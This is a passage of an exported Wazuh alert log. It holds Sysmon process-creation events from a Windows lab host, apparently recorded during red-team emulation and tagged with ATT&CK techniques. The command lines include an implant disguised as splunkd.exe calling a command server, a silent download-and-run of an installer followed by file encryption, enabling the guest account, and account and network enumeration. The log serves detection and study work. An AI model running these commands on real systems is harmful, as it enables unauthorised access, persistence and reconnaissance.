ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""if (test-path 'C:\Program Files (x86)\GnuPG\bin\gpg.exe') { ; } else {New-Item -Type Directory \""PathToAtomicsFolder\..\ExternalPayloads\\\"" -ErrorAction Ignore -Force | Out-Null; invoke-webrequest \""https://files.gpg4win.org/gpg4win-4.1.0.exe\"" -outfile \""PathToAtomicsFolder\..\ExternalPayloads\gpginstall.exe\""; cmd /c \""PathToAtomicsFolder\..\ExternalPayloads\gpginstall.exe\"" /S};  ;  cmd /c 'C:\Program Files (x86)\GnuPG\bin\gpg.exe' -c '$env:temp\test.txt'""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:46:51.196112800Z,55739,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,2,false,4,Powershell process spawned Windows command shell instance,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92004, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:46:52.299",EventChannel,1732952812.1622295,"Nov 30, 2024 @ 07:46:52.299", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,3048, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-C2EB-674A-9906-000000000D00},2024-11-30 07:46:51.195,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-C2EA-674A-9706-000000000D00},"powershell.exe -ExecutionPolicy Bypass -C \""if (test-path 'C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe') { ; } else {New-Item -Type Directory \\\""PathToAtomicsFolder\\..\\ExternalPayloads\\\\\\\"" -ErrorAction Ignore -Force | Out-Null; invoke-webrequest \\\""https://files.gpg4win.org/gpg4win-4.1.0.exe\\\"" -outfile \\\""PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe\\\""; cmd /c \\\""PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe\\\"" /S};  ;  cmd /c 'C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe' -c '$env:temp\\test.txt'\""",0x107a6b,196,C:\\Windows\\system32\\,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\Windows\\system32\\cmd.exe\"" /c \""C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe\"" -c $env:temp\\test.txt",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,k_r_e5MBRlc-D5DF2x4i,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 07:36:15.110
ProcessGuid: {15959494-C06F-674A-8206-000000000D00}
ProcessId: 5968
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  user guest /active:yes
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=A22C23BE5AF113757D68691B10854375F0CE0EFB,MD5=15534275EDAABC58159DD0F8607A71E5,SHA256=E9739D544EE0D428696036CBD656C41DCC505B67CC43DBA7C6BEC4E3959282AC,IMPHASH=EB2C2924EA23E1A5FB0E3F53F46CB709
ParentProcessGuid: {15959494-C06F-674A-8106-000000000D00}
ParentProcessId: 5116
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C net user guest /active:yes
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:36:15.112218100Z,55371,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,3,false,3,A C:\\Windows\\System32\\net.exe binary was started by a Windows cmd shell,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92036, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:36:16.191",EventChannel,1732952176.1500786,"Nov 30, 2024 @ 07:36:16.191", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,5968, , , , , , , , , , ,"[""Windows Command Shell"",""DLL Search Order Hijacking""]","[""T1059.003"",""T1574.001""]","[""Execution"",""Persistence"",""Privilege Escalation"",""Defense Evasion""]", , , ,net.exe,C:\\Windows\\System32\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-C06F-674A-8206-000000000D00},2024-11-30 07:36:15.110,"SHA1=A22C23BE5AF113757D68691B10854375F0CE0EFB,MD5=15534275EDAABC58159DD0F8607A71E5,SHA256=E9739D544EE0D428696036CBD656C41DCC505B67CC43DBA7C6BEC4E3959282AC,IMPHASH=EB2C2924EA23E1A5FB0E3F53F46CB709","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-C06F-674A-8106-000000000D00},cmd.exe /C net user guest /active:yes,0x107a6b,5116,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,net  user guest /active:yes,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,lPr_e5MBRlc-D5DF2x4i,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 07:36:15.120
ProcessGuid: {15959494-C06F-674A-8306-000000000D00}
ProcessId: 712
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1  user guest /active:yes
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=DC6E267A6BF85702F2DD52CB55F0967E2DB7E80D,MD5=AF569DE92AB6C1B9C681AF1E799F9983,SHA256=FFC30745BE3B6C2771FC4B2993CFF50B5226B271C412467E97B1DC1086DEA888,IMPHASH=5322AC1A3CFF9C8A2AE16A789E26231E
ParentProcessGuid: {15959494-C06F-674A-8206-000000000D00}
ParentProcessId: 5968
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: net  user guest /active:yes
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:36:15.121358400Z,55372,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,3,A net.exe account discovery command was initiated,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92039, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:36:16.223",EventChannel,1732952176.1506655,"Nov 30, 2024 @ 07:36:16.223", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,712, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net1.exe,C:\\Windows\\System32\\net1.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-C06F-674A-8306-000000000D00},2024-11-30 07:36:15.120,"SHA1=DC6E267A6BF85702F2DD52CB55F0967E2DB7E80D,MD5=AF569DE92AB6C1B9C681AF1E799F9983,SHA256=FFC30745BE3B6C2771FC4B2993CFF50B5226B271C412467E97B1DC1086DEA888,IMPHASH=5322AC1A3CFF9C8A2AE16A789E26231E","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-C06F-674A-8206-000000000D00},net  user guest /active:yes,0x107a6b,5968,C:\\Windows\\system32\\,C:\\Windows\\System32\\net.exe,C:\\Windows\\system32\\net1  user guest /active:yes,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,c_r3e5MBRlc-D5DFxB66,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1087.001,technique_name=Local Account
UtcTime: 2024-11-30 07:27:30.129
ProcessGuid: {15959494-BE62-674A-6006-000000000D00}
ProcessId: 6856
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C net localgroup && net localgroup ""Administrators""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:27:30.131335100Z,55233,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,26,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:27:31.209",EventChannel,1732951651.1371925,"Nov 30, 2024 @ 07:27:31.209", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,6856, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-BE62-674A-6006-000000000D00},2024-11-30 07:27:30.129,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1087.001,technique_name=Local Account",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C net localgroup &amp;&amp; net localgroup \""Administrators\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,iPr8e5MBRlc-D5DF9B7o,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 07:33:11.790
ProcessGuid: {15959494-BFB7-674A-7306-000000000D00}
ProcessId: 6660
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C netstat && net use && net sessions
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:33:11.794285100Z,55302,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,4,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:33:12.870",EventChannel,1732951992.1456137,"Nov 30, 2024 @ 07:33:12.870", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,6660, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-BFB7-674A-7306-000000000D00},2024-11-30 07:33:11.790,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,cmd.exe /C netstat &amp;&amp; net use &amp;&amp; net sessions,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,mfoBfJMBRlc-D5DFrx7p,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 07:38:16.843
ProcessGuid: {15959494-C0E8-674A-8806-000000000D00}
ProcessId: 7416
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1  user /domain
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=DC6E267A6BF85702F2DD52CB55F0967E2DB7E80D,MD5=AF569DE92AB6C1B9C681AF1E799F9983,SHA256=FFC30745BE3B6C2771FC4B2993CFF50B5226B271C412467E97B1DC1086DEA888,IMPHASH=5322AC1A3CFF9C8A2AE16A789E26231E
ParentProcessGuid: {15959494-C0E8-674A-8706-000000000D00}
ParentProcessId: 3412
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: net  user /domain
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:38:16.844484300Z,55386,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,2,false,3,A net.exe account discovery command was initiated,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92039, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:38:17.961",EventChannel,1732952297.1536066,"Nov 30, 2024 @ 07:38:17.961", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,7416, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net1.exe,C:\\Windows\\System32\\net1.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-C0E8-674A-8806-000000000D00},2024-11-30 07:38:16.843,"SHA1=DC6E267A6BF85702F2DD52CB55F0967E2DB7E80D,MD5=AF569DE92AB6C1B9C681AF1E799F9983,SHA256=FFC30745BE3B6C2771FC4B2993CFF50B5226B271C412467E97B1DC1086DEA888,IMPHASH=5322AC1A3CFF9C8A2AE16A789E26231E","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-C0E8-674A-8706-000000000D00},net  user /domain,0x107a6b,3412,C:\\Windows\\system32\\,C:\\Windows\\System32\\net.exe,C:\\Windows\\system32\\net1  user /domain,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
